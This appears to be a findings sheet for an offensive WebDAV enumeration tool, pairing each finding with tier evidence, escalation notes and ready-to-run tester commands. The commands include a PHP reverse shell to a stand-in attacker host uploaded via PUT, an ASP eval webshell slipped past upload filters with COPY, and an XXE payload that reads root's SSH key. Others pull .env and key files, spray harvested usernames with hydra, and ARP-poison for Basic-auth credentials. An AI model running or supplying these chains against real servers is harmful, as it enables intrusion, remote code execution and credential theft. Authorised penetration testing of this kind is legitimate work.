summary: webdav.py is a two-tier WebDAV enumerator: passive (OPTIONS/DAV compliance/backend fingerprint/WWW-Authenticate) + active (PROPFIND depth, MKCOL/COPY/MOVE/PROPPATCH/LOCK/UNLOCK write tests, anonymous PUT roundtrip, PROPFIND XXE, If:-header bypass, SVN repo probe, sensitive-href classifier), plus exploit-gated PUT+execute webshell chain and CVE-2017-7269-adjacent COPY/MOVE upload-filter bypass — every write probe uses randomised /recce_dav_probe_<hex>/ names and cleans up in a try/finally. Reaches genuine T2 in three places (anon PUT proven, PUT→execute proven, COPY bypass proven, PROPFIND XXE with returned file content), and T2 for SVN checkout leaks (source + author list). Biggest gap: no chain from PUT→execute proof into a real reverse-shell drop, and the captured SVN/creator-displayname user list is not auto-fed to the credential-spray queue.

findings.tier_evidence: OPTIONS Allow + PROPFIND multistatus — surface only.
findings.promotion_notes: Immediately runs mount enum + verb probes → already promoted internally.

findings.tier_evidence: Product/version regex match on Server/vendor headers.
findings.promotion_notes: Feed product+version into offline CVE DB; IIS 6.0 → CVE-2017-7269 candidate for the PUT→execute chain.

findings.title_pattern: WebDAV directory tree disclosed via PROPFIND Depth: infinity
findings.promotion_notes: GET each sensitive-looking href (already classified via cross_mount_leaks); extracted config/credential content is T2.
findings.tester_next_step: curl -sSk -X PROPFIND -H 'Depth: infinity' http://IP:PORT/webdav/ | grep -oE '<D:href>[^<]+' ; for h in $(above); do curl -sSk http://IP:PORT$h; done

findings.tier_evidence: verb_allowlist actually sends MKCOL/PROPPATCH/PUT/COPY/MOVE/LOCK and records status; 201/204/207 accepted = deterministic.
findings.promotion_notes: Already triggers anonymous_put_proof + put_webshell_chain when the gates fire; the T2 promotion is native.
findings.tester_next_step: curl -sSk -X MKCOL http://IP:PORT/recce_probe/ ; curl -sSk -X PUT --data 'x' http://IP:PORT/recce_probe/x.txt ; curl -sSk http://IP:PORT/recce_probe/x.txt ; curl -sSk -X DELETE http://IP:PORT/recce_probe/x.txt

findings.title_pattern: WebDAV MKCOL - writable collection creation allowed
findings.tier_evidence: MKCOL returned 201 — proven collection created (then cleaned up).
findings.promotion_notes: Under the new collection, run copy_move_bypass and put_webshell_chain — the T2 chain is already wired.

findings.title_pattern: Anonymous WebDAV PUT - arbitrary file write (proven)
findings.tier_evidence: PUT canary + GET reads back the canary — deterministic write proof.
findings.promotion_notes: Under --upload-shell put_webshell_chain fires; T3 is a real reverse-shell drop the tester triggers with the language-appropriate payload.

findings.tier_evidence: One-liner PUT + GET returned 'recce-rce-<nonce>' from server-computed shell_exec — plain reflection cannot fake the nonce.
findings.promotion_notes: Swap the harmless nonce payload for a persistent reverse shell / bind shell. Cleanup already handled per current DELETE.
findings.tester_next_step: nc -lvnp 4444 & curl -sSk -X PUT --data '<?php exec("bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\""); ?>' http://IP:PORT/webdav/rev.php ; curl -sSk http://IP:PORT/webdav/rev.php

findings.tier_evidence: PUT .txt → COPY → .asp/.aspx/.php returns HTTP 200 for the renamed script extension.
findings.promotion_notes: PUT the actual webshell body as .txt, COPY to .aspx/.php/.jsp, GET with a command param → T3 RCE.
findings.tester_next_step: curl -sSk -X PUT --data '<%eval request("c")%>' http://IP:PORT/x.txt ; curl -sSk -X COPY -H 'Destination: http://IP:PORT/x.asp' http://IP:PORT/x.txt ; curl -sSk 'http://IP:PORT/x.asp?c=whoami'

findings.tier_evidence: _XXE_HIT confirms /etc/passwd or win.ini content in the multistatus body — actual server-side file read.
findings.promotion_notes: Follow up with /root/.ssh/id_rsa, /var/www/*/.env; captured SSH key → SSH pivot is T3.
findings.tester_next_step:
cat > xxe.xml <<'EOF'
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///root/.ssh/id_rsa">]><D:propfind xmlns:D="DAV:"><D:prop><D:displayname>&x;</D:displayname></D:prop></D:propfind>
EOF
curl -sSk -X PROPFIND -H 'Content-Type: application/xml' --data-binary @xxe.xml http://IP:PORT/

findings.tier_evidence: 401 → 207 with bogus If: token — deterministic canonicalisation bypass.
findings.promotion_notes: With bypass proven, replay Depth:infinity + PUT via the If: header → data disclosure and write reach T2.
svn checkout the entire repo, run trufflehog / recce loot regex → captured secrets = T2; captured commit authors → known_users spray.
findings.tester_next_step: svn checkout --non-interactive http://IP:PORT/ /tmp/svnrepo ; svn log /tmp/svnrepo | awk '/^r/{print $3}' | sort -u ; trufflehog filesystem /tmp/svnrepo

findings.title_pattern: WebDAV LOCK accepts unauthenticated lock-null resources
findings.tier_evidence: LOCK against random path returned 200/201/207 unauth.
findings.promotion_notes: Lock-null is DoS-flavoured; PUT/MKCOL primitives already probed separately for higher-value promotion.

findings.tier_evidence: PROPFIND hrefs matched against _SENSITIVE_HREF (.git, .env, wp-config, backup, id_rsa, ...).
findings.promotion_notes: GET each classified sensitive href unauth; captured content → T2.
findings.tester_next_step: curl -sSk http://IP:PORT/.env ; curl -sSk http://IP:PORT/backup/dump.sql ; curl -sSk http://IP:PORT/.ssh/id_rsa

findings.title_pattern: WebDAV PROPFIND leaks creator-displayname user list
findings.promotion_notes: Push user list into known_users; run hydra/nxc with the harvested names against SSH/RDP/SMB/OWA → T3 credential-lands foothold.
findings.tester_next_step: USERS=$(curl -sSk -X PROPFIND -H 'Depth: 1' http://IP:PORT/svn/ | grep -oE '<D:creator-displayname>[^<]+' | sed 's/.*>//') ; echo $USERS > u.txt ; hydra -L u.txt -P /usr/share/wordlists/rockyou.txt ssh://IP -f

findings.title_pattern: WebDAV Basic auth over cleartext channel
findings.tier_evidence: WWW-Authenticate: Basic on plain-HTTP — configuration only.
findings.promotion_notes: MitM the credential on the wire (ARP-poison / rogue AP) → captured plaintext Basic auth is T3 foothold.
